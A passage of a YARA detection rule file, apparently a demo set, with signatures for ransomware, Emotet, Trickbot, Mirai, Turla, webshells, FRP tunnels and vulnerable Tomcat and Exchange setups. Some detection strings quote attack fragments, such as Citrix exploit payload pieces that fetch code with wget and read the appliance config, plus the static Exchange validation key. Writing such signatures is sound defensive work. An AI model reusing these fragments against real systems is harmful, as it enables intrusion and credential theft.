00 66 00 61 00 75 00 6C 00 74 00 00\n               00 5C 00 6E 00 6F 00 74 00 65 00 70 00 61 00 64\n               00 2E 00 65 00 78 00 65 00 } \n      $s1 = \"bootfont.bin\" wide fullword\n      $sc2 = { 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 00\n               00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 2E\n               00 6F 00 6C 00 64 00 00 00 54 00 6F 00 72 00 20\n               00 62 00 72 00 6F 00 77 00 73 00 65 00 72 00 } \n      $op1 = { c7 85 58 ff ff ff 55 00 6b 00 c7 85 5c ff ff ff } \n      $op2 = { 50 c7 85 7a ff ff ff 5c } \n      $op3 = { 8b 75 08 8a 84 0d 20 ff ff ff ff 45 08 32 06 8b } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) or 4 of them\n}\n\nrule MAL_RANSOM_COVID19_Apr20_1_RID2ECC : CRIME DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects ransomware distributed in COVID-19 theme\"\n      author = \"Florian Roth\"\n      reference = \"https://unit42.paloaltonetworks.com/covid-19-themed-cyber-attacks-target-government-and-medical-organizations/\"\n      date = \"2020-04-15 11:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2779863a173ff975148cb3156ee593cb5719a0ab238ea7c9e0b0ca3b5a4a9326\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/savekey.php\" wide\n      $op1 = { 3f ff ff ff ff ff 0b b4 } \n      $op2 = { 60 2e 2e 2e af 34 34 34 b8 34 34 34 b8 34 34 34 } \n      $op3 = { 1f 07 1a 37 85 05 05 36 83 05 05 36 83 05 05 34 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 2 of them\n}\n\nrule HKTL_FRP_Apr20_1_RID2BFF : DEMO HKTL T1090 {\n   meta:\n      description = \"Detects FRP fast reverse proxy tool often used by threat groups\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/fatedier/frp\"\n      date = \"2020-04-07 09:30:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-11-03\"\n      hash1 = \"05537c1c4e29db76a24320fb7cb80b189860389cdb16a9dbeb0c8d30d9b37006\"\n      hash2 = \"08c685c8febb5385f7548c2a64a27bae7123a937c5af958ebc08a3accb29978d\"\n      tags = \"DEMO, HKTL, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"frp/vendor/github.com/spf13/\" ascii\n      $x2 = \"github.com/fatedier/frp/vendor/\" ascii\n      $fpg2 = \"<html\" \n      $fpg3 = \"<HTML\" \n      $fpg6 = \"<?xml\" \n   condition: \n      1 of ( $x* ) and not 1 of ( $fp* )\n}\n\nrule HKTL_FRP_INI_Apr20_1_RID2D3E : DEMO FILE HKTL T1090 {\n   meta:\n      description = \"Detects FRP fast reverse proxy tool INI file often used by threat groups\"\n      author = \"Florian Roth\"\n      reference = \"Chinese Hacktools OpenDir\"\n      date = \"2020-04-07 10:23:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1dabef3c170e4e559c50d603d47fb7f66f6e3da75a65c3435b18175d6e9785bb\"\n      tags = \"DEMO, FILE, HKTL, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"[common]\" ascii\n      $s1 = \"server_addr =\" ascii fullword\n      $s2 = \"remote_port =\" ascii fullword\n      $s3 = \"[RemoteDesktop]\" ascii fullword\n      $s4 = \"local_ip = \" ascii\n      $s5 = \"type = tcp\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x635b and filesize < 1KB and $h1 at 0 and all of them\n}\n\nrule APT_MAL_LNX_Penquin_Turla_Apr20_1_RID329A : APT DEMO FILE G0010 LINUX MAL RUSSIA {\n   meta:\n      description = \"Detects Penquin Turla Linux malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/IntezerLabs/status/1247131160452509696\"\n      date = \"2020-04-05 14:12:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502\"\n      hash2 = \"8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc\"\n      tags = \"APT, DEMO, FILE, G0010, LINUX, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/root/.hsperfdata\" ascii fullword\n      $s2 = \"Desc|     Filename     |  size  |state|\" ascii fullword\n      $s3 = \"IPv6 address %s not supported\" ascii fullword\n      $s4 = \"File already exist on remote filesystem !\" ascii fullword\n      $s5 = \"/tmp/.sync.pid\" ascii fullword\n      $s6 = \"'gateway' supported only on ethernet/FDDI/token ring/802.11/ATM LANE/Fibre Channel\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 5000KB and 4 of them\n}\n\nrule VUL_Tomcat_Catalina_CVE_2020_1938_RID31DF : CVE_2020_1938 DEMO T1210 VULN {\n   meta:\n      description = \"Detects a possibly active and vulnerable Tomcat configuration that includes an accessible and unprotected AJP connector (you can ignore backup files or files that are not actively used)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.chaitin.cn/en/ghostcat\"\n      date = \"2020-02-28 13:41:01\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2020_1938, DEMO, T1210, VULN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"<?xml \" \n      $a1 = \"<Service name=\\\"Catalina\\\">\" ascii\n      $v1 = \"<Connector port=\\\"8009\\\" protocol=\\\"AJP/1.3\\\" redirectPort=\\\"8443\\\"/>\" ascii\n      $fp1 = \"<!--<Connector port=\\\"8009\\\" protocol=\\\"AJP/1.3\\\" redirectPort=\\\"8443\\\"\" ascii\n      $fp2 = \" secret=\\\"\" ascii\n      $fp3 = \" requiredSecret=\\\"\" ascii\n   condition: \n      $h1 at 0 and filesize <= 300KB and $a1 and $v1 and not 1 of ( $fp* )\n}\n\nrule VUL_Exchange_CVE_2020_0688_RID2F1F : CVE_2020_0688 DEMO VULN {\n   meta:\n      description = \"Detects static validation key used by Exchange server in web.config\"\n      author = \"Florian Roth\"\n      reference = \"https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys\"\n      date = \"2020-02-26 11:43:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2020_0688, DEMO, VULN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"<?xml \" \n      $x1 = \"<machineKey validationKey=\\\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\\\"\" ascii wide\n   condition: \n      filesize <= 300KB and $h1 at 0 and $x1\n}\n\nrule WEBSHELL_ASPX_XslTransform_Aug21_RID3233 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects an ASPX webshell utilizing XSL Transformations\"\n      author = \"Max Altgelt\"\n      reference = \"https://gist.github.com/JohnHammond/cdae03ca5bc2a14a735ad0334dcb93d6\"\n      date = \"2020-02-23 13:55:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $csharpshell = \"Language=\\\"C#\\\"\" nocase\n      $x1 = \"<root>1</root>\" \n      $x2 = \".LoadXml(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(\" \n      $s1 = \"XsltSettings.TrustedXslt\" \n      $s2 = \"Xml.XmlUrlResolver\" \n      $s3 = \"FromBase64String(Request[\\\"\" \n   condition: \n      filesize < 500KB and $csharpshell and ( 1 of ( $x* ) or all of ( $s* ) )\n}\n\nrule MAL_Emotet_Jan20_1_RID2D22 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Emotet malware\"\n      author = \"Florian Roth\"\n      reference = \"https://app.any.run/tasks/5e81638e-df2e-4a5b-9e45-b07c38d53929/\"\n      date = \"2020-01-29 10:18:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e7c22ccdb1103ee6bd15c528270f56913bb2f47345b360802b74084563f1b73d\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $op0 = { 74 60 8d 34 18 eb 54 03 c3 50 ff 15 18 08 41 00 } \n      $op1 = { 03 fe 66 39 07 0f 85 2a ff ff ff 8b 4d f0 6a 20 } \n      $op2 = { 8b 7d fc 0f 85 49 ff ff ff 85 db 0f 84 d1 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 200KB and ( pe.imphash ( ) == \"009889c73bd2e55113bf6dfa5f395e0d\" or 1 of them )\n}\n\nrule SUSP_BAT_Aux_Jan20_1_RID2D89 : DEMO FILE SCRIPT SUSP {\n   meta:\n      description = \"Detects BAT file often dropped to cleanup temp dirs during infection\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@quoscient/the-chicken-keeps-laying-new-eggs-uncovering-new-gc-maas-tools-used-by-top-tier-threat-actors-531d80a6b4e9\"\n      date = \"2020-01-29 10:36:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f5d558ec505b635b1e37557350562ad6f79b3da5cf2cf74db6e6e648b7a47127\"\n      tags = \"DEMO, FILE, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if exist \\\"C:\\\\Users\\\\\" ascii\n      $s2 = \"\\\\AppData\\\\Local\\\\Temp\\\\\" ascii\n      $s3 = \"del \\\"C:\\\\Users\\\\\" ascii\n      $s4 = \".bat\\\"\" ascii\n      $s5 = \".exe\\\" goto\" ascii\n   condition: \n      uint8 ( 0 ) == 0x3a and filesize <= 1KB and all of them\n}\n\nrule EXPL_Shitrix_Exploit_Code_Jan20_1_RID331C : CVE_2019_19781 DEMO EXPLOIT FILE T1105 {\n   meta:\n      description = \"Detects payloads used in Shitrix exploitation CVE-2019-19781\"\n      author = \"Florian Roth\"\n      reference = \"https://isc.sans.edu/forums/diary/Citrix+ADC+Exploits+Overview+of+Observed+Payloads/25704/\"\n      date = \"2020-01-13 14:33:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2019_19781, DEMO, EXPLOIT, FILE, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s01 = \"/netscaler/portal/scripts/rmpm.pl\" ascii\n      $s02 = \"tee /netscaler/portal/templates/\" ascii\n      $s03 = \"exec(\\\\'(wget -q -O- http://\" ascii\n      $s04 = \"cd /netscaler/portal; ls\" ascii\n      $s05 = \"cat /flash/nsconfig/ns.conf\" ascii\n      $s06 = \"/netscaler/portal/scripts/PersonalBookmak.pl\" ascii\n      $s07 = \"template.new({'BLOCK'='print readpipe(\" ascii\n      $s08 = \"pwnpzi1337\" fullword ascii\n      $s09 = \"template.new({'BLOCK'=\" \n      $s10 = \"template.new({'BLOCK'%3d\" \n      $s11 = \"my ($citrixmd, %FORM);\" \n      $s12 = \"(CMD, \\\"($citrixmd) 2>&1\" \n      $b1 = \"NSC_USER:\" ascii nocase\n      $b2 = \"NSC_NONCE:\" ascii nocase\n      $b3 = \"/../\" ascii\n   condition: \n      1 of ( $s* ) or all of ( $b* )\n}\n\nrule MAL_ME_RawDisk_Agent_Jan20_2_RID30A9 : DEMO EXE FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects suspicious malware using ElRawDisk\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/jfslowik/status/1212501454549741568?s=09\"\n      date = \"2020-01-02 12:49:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"44100c73c6e2529c591a10cd3668691d92dc0241152ec82a72c6e63da299d3a2\"\n      tags = \"DEMO, EXE, FILE, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\Dustman.pdb\" ascii\n      $x2 = \"/c agent.exe A\" fullword ascii\n      $s1 = \"C:\\\\windows\\\\system32\\\\cmd.exe\" fullword ascii\n      $s2 = \"The Magic Word!\" fullword ascii\n      $s3 = \"Software\\\\Oracle\\\\VirtualBox\" fullword wide\n      $s4 = \"\\\\assistant.sys\" wide\n      $s5 = \"Down With Bin Salman\" fullword wide\n      $sc1 = { 00 5C 00 5C 00 2E 00 5C 00 25 00 73 } \n      $op1 = { 49 81 c6 ff ff ff 7f 4c 89 b4 24 98 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 3000KB and ( 1 of ( $x* ) or 3 of them )\n}\n\nrule MAL_ME_RawDisk_Agent_Jan20_1_RID30A8 : DEMO EXE FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects suspicious malware using ElRawDisk\"\n      author = \"Florian Roth\"\n      reference = \"Saudi National Cybersecurity Authority - Destructive Attack DUSTMAN\"\n      date = \"2020-01-02 12:49:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"44100c73c6e2529c591a10cd3668691d92dc0241152ec82a72c6e63da299d3a2\"\n      tags = \"DEMO, EXE, FILE, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\drv\\\\agent.plain.pdb\" ascii\n      $x2 = \" ************** Down With Saudi Kingdom, Down With Bin Salman ************** \" fullword ascii\n      $s1 = \".?AVERDError@@\" fullword ascii\n      $s2 = \"b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d\" fullword wide\n      $s3 = \"\\\\\\\\?\\\\ElRawDisk\" fullword wide\n      $s4 = \"\\\\??\\\\c:\" wide\n      $op1 = { e9 3d ff ff ff 33 c0 48 89 05 0d ff 00 00 48 8b } \n      $op2 = { 0f b6 0c 01 88 48 34 48 8b 8d a8 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and ( 1 of ( $x* ) or 4 of them )\n}\n\nrule SUSP_VHD_Suspicious_Small_Size_RID3285 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects suspicious VHD files\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/MeltX0R/status/1208095892877774850\"\n      date = \"2019-12-21 14:08:41\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-24\"\n      hash1 = \"3382a75bd959d2194c4b1a8885df93e8770f4ebaeaff441a5180ceadf1656cd9\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $hc1 = { 63 6F 6E 65 63 74 69 78 } \n      $hc2a = { 49 6E 76 61 6C 69 64 20 70 61 72 74 69 74 69 6F\n               6E 20 74 61 62 6C 65 00 45 72 72 6F 72 20 6C 6F\n               61 64 69 6E 67 20 6F 70 65 72 61 74 69 6E 67 20\n               73 79 73 74 65 6D 00 4D 69 73 73 69 6E 67 20 6F\n               70 65 72 61 74 69 6E 67 20 73 79 73 74 65 6D } \n      $hc2b = \"connectix\" \n   condition: \n      not uint16 ( 0 ) == 0x5a4d and filesize > 1KB and filesize <= 4000KB and ( $hc1 at 0 or all of ( $hc2* ) )\n}\n\nrule SUSP_RAR_NtdsDIT_RID2C79 : DEMO FILE SUSP {\n   meta:\n      description = \"Detects suspicious RAR file that contains ntds.dit or SAM export\"\n      author = \"Florian Roth\"\n      reference = \"https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers\"\n      date = \"2019-12-16 09:50:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ntds.dit0\" ascii fullword\n      $x2 = { 0? 53 41 4D 30 01 00 03 } \n      $x3 = { 0? 73 61 6D 30 01 00 03 } \n   condition: \n      uint32 ( 0 ) == 0x21726152 and 1 of them\n}\n\nrule MAL_Mirai_Nov19_1_RID2CC8 : DEMO FILE MAL {\n   meta:\n      description = \"Detects Mirai malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/bad_packets/status/1194049104533282816\"\n      date = \"2019-11-13 10:03:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"bbb83da15d4dabd395996ed120435e276a6ddfbadafb9a7f096597c869c6c739\"\n      hash2 = \"fadbbe439f80cc33da0222f01973f27cce9f5ab0709f1bfbf1a954ceac5a579b\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SERVZUXO\" fullword ascii\n      $s2 = \"-loldongs\" fullword ascii\n      $s3 = \"/dev/null\" fullword ascii\n      $s4 = \"/bin/busybox\" fullword ascii\n      $sc1 = { 47 72 6F 75 70 73 3A 09 30 } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize <= 100KB and 4 of them\n}\n\nrule SUSP_XORed_Mozilla_Oct19_RID2FA3 : DEMO SUSP T1110 {\n   meta:\n      description = \"Detects suspicious single byte XORed keyword 'Mozilla/5.0' - it uses yara's XOR modifier and therefore cannot print the XOR key. You can use the CyberChef recipe linked in the reference field to brute force the used key.\"\n      author = \"Florian Roth\"\n      reference = \"https://gchq.github.io/CyberChef/#recipe=XOR_Brute_Force()\"\n      date = \"2019-10-28 12:05:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-11-03\"\n      tags = \"DEMO, SUSP, T1110\"\n      minimum_yara = \"3.8.0\"\n      \n   strings:\n      $xo1 = \"Mozilla/5.0\" xor ascii wide\n      $xof1 = \"Mozilla/5.0\" ascii wide\n      $fpa1 = \"Sentinel Labs\" wide\n      $fpa2 = \"<filter object at\" ascii\n      $fpb1 = { 64 65 78 0a 30 33 35 } \n   condition: \n      $xo1 and not $xof1 and not 1 of ( $fpa* ) and not $fpb1 at 0\n}\n\nrule MAL_CRIME_CobaltGang_Malware_Oct19_1_RID3392 : CRIME DEMO EXE FILE G0080 MAL {\n   meta:\n      description = \"Detects CobaltGang malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/vxsh4d0w/status/1187353649015611392\"\n      date = \"2019-10-24 14:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"72125933265f884ceb8ab64ab303ea76aaeb7877faee8976d398acd0d0b7356b\"\n      hash2 = \"893339624602c7b3a6f481aed9509b53e4e995d6771c72d726ba5a6b319608a7\"\n      hash3 = \"3c34bbf641df25f9accd05b27b9058e25554fdfea0e879f5ca21ffa460ad2b01\"\n      tags = \"CRIME, DEMO, EXE, FILE, G0080, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $op_a1 = { 0f 44 c2 eb 0a 31 c0 80 fa 20 0f 94 c0 01 c0 5d } \n      $op_b1 = { 89 e5 53 8b 55 08 8b 4d 0c 8a 1c 01 88 1c 02 83 } \n      $op_b2 = { 89 e5 53 8b 55 08 8b 45 0c 8a 1c 0a 88 1c 08 83 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and ( pe.imphash ( ) == \"d1e3f8d02cce09520379e5c1e72f862f\" or pe.imphash ( ) == \"8e26df99c70f79cb8b1ea2ef6f8e52ac\" or ( $op_a1 and 1 of ( $op_b* ) ) )\n}\n\nrule SUSP_TINY_PE_RID2AF3 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects Tiny PE file\"\n      author = \"Florian Roth\"\n      reference = \"https://webserver2.tecgraf.puc-rio.br/~ismael/Cursos/YC++/apostilas/win32_xcoff_pe/tyne-example/Tiny%20PE.htm\"\n      date = \"2019-10-23 09:36:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $header = { 4D 5A 00 00 50 45 00 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and uint16 ( 4 ) == 0x4550 and filesize <= 20KB and $header at 0\n}\n\nrule SUSP_WER_Critical_HeapCorruption_Oct19_RID3534 : DEMO FILE SUSP {\n   meta:\n      description = \"Detects a crashed application that crashed due to a heap corruption error (could be a sign of exploitation)\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1185459425710092288\"\n      date = \"2019-10-18 16:03:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-11-22\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $a1 = \"ReportIdentifier=\" wide\n      $a2 = \".Name=Fault Module Name\" wide\n      $s1 = \"c0000374\" wide\n   condition: \n      ( uint32be ( 0 ) == 0x56006500 or uint32be ( 0 ) == 0xfffe5600 ) and all of them\n}\n\nrule LOG_TeamViewer_Connect_Chinese_Keyboard_Layout_RID38FF : CHINA DEMO LOG T1072 T1219 {\n   meta:\n      description = \"Detects a suspicious TeamViewer log entry stating that the remote systems had a Chinese keyboard layout\"\n      author = \"Florian Roth\"\n      reference = \"https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/default-input-locales-for-windows-language-packs\"\n      date = \"2019-10-12 18:45:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2020-12-16\"\n      tags = \"CHINA, DEMO, LOG, T1072, T1219\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Changing keyboard layout to: 0804\" ascii\n      $x2 = \"Changing keyboard layout to: 042a\" \n      $fp1 = \"Changing keyboard layout to: 08040804\" ascii\n      $fp2 = \"Changing keyboard layout to: 042a042a\" ascii\n   condition: \n      ( #x1 + #x2 ) > ( #fp1 + #fp2 )\n}\n\nrule LOG_TeamViewer_Connect_Russian_Keyboard_Layout_RID3925 : DEMO LOG T1072 T1219 {\n   meta:\n      description = \"Detects a suspicious TeamViewer log entry stating that the remote systems had a Russian keyboard layout\"\n      author = \"Florian Roth\"\n      reference = \"https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/default-input-locales-for-windows-language-packs\"\n      date = \"2019-10-12 18:51:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-07\"\n      tags = \"DEMO, LOG, T1072, T1219\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Changing keyboard layout to: 0419\" ascii\n      $fp1 = \"Changing keyboard layout to: 04190419\" ascii\n   condition: \n      #x1 > #fp1\n}\n\nrule MAL_Emotet_JS_Dropper_Oct19_1_RID316E : DEMO FILE MAL {\n   meta:\n      description = \"Detects Emotet JS dropper\"\n      author = \"Florian Roth\"\n      reference = \"https://app.any.run/tasks/aaa75105-dc85-48ca-9732-085b2ceeb6eb/\"\n      date = \"2019-10-03 13:22:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"38295d728522426672b9497f63b72066e811f5b53a14fb4c4ffc23d4efbbca4a\"\n      hash2 = \"9bc004a53816a5b46bfb08e819ac1cf32c3bdc556a87a58cbada416c10423573\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { FF FE 76 00 61 00 72 00 20 00 61 00 3D 00 5B 00\n               27 00 } \n   condition: \n      uint32 ( 0 ) == 0x0076feff and filesize <= 700KB and $xc1 at 0\n}\n\nrule MAL_Trickbot_Malware_Oct19_1_RID3133 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Trickbot malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-10-02 13:12:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"58852140a2dc30e799b7d50519c56e2fd3bb506691918dbf5d4244cc1f4558a2\"\n      hash2 = \"aabf54eb27de3d72078bbe8d99a92f5bcc1e43ff86774eb5321ed25fba5d27d4\"\n      hash3 = \"9d6e4ad7f84d025bbe9f95e74542e7d9f79e054f6dcd7b37296f01e7edd2abae\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Celestor@hotmail.com\" fullword ascii\n      $s2 = \"\\\\txtPassword\" ascii\n      $s14 = \"Invalid Password, try again!\" fullword wide\n      $op1 = { 78 c4 40 00 ff ff ff ff b4 47 41 } \n      $op2 = { 9b 68 b2 34 46 00 eb 14 8d 55 e4 8d 45 e8 52 50 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 3 of them\n}\n\nrule MAL_Trickbot_Malware_Oct19_2_RID3134 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Trickbot malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-10-02 13:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"57b8ea2870f5176a30e6cba2d717fb3ff342f8bd36bac652dc4194a313b5fa64\"\n      hash2 = \"d75561a744e3ed45dfbf25fe7c120bd24c38138ac469fd02e383dd455a540334\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\User\\\\Desktop\\\\Encrypt\\\\Math_Cad\\\\Release\\\\Math_Cad.pdb\" fullword ascii\n      $x2 = \"AxedWV3OVTFfnGb\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 1 of them\n}\n\nrule MAL_Trickbot_Malware_Oct19_3_RID3135 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Trickbot malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-10-02 13:12:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"25a4ae2a1ce6dbe7da4ba1e2559caa7ed080762cf52dba6c8b55450852135504\"\n      hash2 = \"57b8ea2870f5176a30e6cba2d717fb3ff342f8bd36bac652dc4194a313b5fa64\"\n      hash3 = \"d75561a744e3ed45dfbf25fe7c120bd24c38138ac469fd02e383dd455a540334\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"Decrypt Shell Fail\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and ( 1 of them or pe.imphash ( ) == \"4e3fbfbf1fc23f646cd40a6fe09385a7\" )\n}\n\nrule MAL_Trickbot_Malware_Oct19_4_RID3136 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Trickbot malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-10-02 13:12:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"25a4ae2a1ce6dbe7da4ba1e2559caa7ed080762cf52dba6c8b55450852135504\"\n      hash2 = \"e92dd00b092b435420f0996e4f557023fe1436110a11f0f61fbb628b959aac99\"\n      hash3 = \"aabf54eb27de3d72078bbe8d99a92f5bcc1e43ff86774eb5321ed25fba5d27d4\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"c:\\\\users\\\\user\\\\documents\\\\visual studio 2005\\\\projects\\\\adzxser\\\\release\\\\ADZXSER.pdb\" fullword ascii\n      $x2 = \"http://root-hack.org\" fullword ascii\n      $x3 = \"http://hax-studios.net\" fullword ascii\n      $x4 = \"5OCFBBKCAZxWUE#$_SVRR[SQJ\" fullword ascii\n      $x5 = \"G*\\\\AC:\\\\Users\\\\911\\\\Desktop\\\\cButtonBar\\\\cButtonBar\\\\ButtonBar.vbp\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 1 of 